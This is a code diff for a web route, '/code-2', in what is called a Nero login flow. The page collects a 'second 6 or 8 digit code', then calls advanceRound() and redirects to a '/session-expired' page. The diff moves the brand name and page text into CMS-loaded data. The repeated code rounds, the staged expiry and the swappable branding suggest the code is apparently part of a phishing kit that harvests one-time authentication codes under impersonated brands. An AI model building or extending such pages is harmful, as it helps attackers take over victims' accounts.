@@ -1,26 +1,23 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { CodeStep } from "@/components/nero/CodeStep";
 import { advanceRound } from "@/lib/nero-flow";
+import { getSiteData } from "@/lib/cms.functions";
+import { buildCodeStepHead } from "@/lib/route-head";
 
 export const Route = createFileRoute("/code-2")({
-  head: () => ({
-    meta: [
-      { title: "Confirm second code — Nero" },
-      { name: "description", content: "Enter the second 6 or 8 digit code to confirm your Nero login." },
-      { property: "og:title", content: "Confirm second code — Nero" },
-      { property: "og:description", content: "Enter the second 6 or 8 digit code to confirm your Nero login." },
-    ],
-  }),
+  loader: () => getSiteData(),
+  head: ({ loaderData }) => buildCodeStepHead(loaderData?.content["code-2"]),
   component: CodeTwoPage,
 });
 
 function CodeTwoPage() {
+  const { brand, content } = Route.useLoaderData();
   const navigate = useNavigate();
   return (
     <CodeStep
       step={2}
-      title="Confirm your second code"
-      description="One more code to finish. Enter the second 6 or 8 digit code sent to your device."
+      brand={brand}
+      content={content["code-2"]}
       onSubmit={() => {
         advanceRound();
         navigate({ to: "/session-expired" });
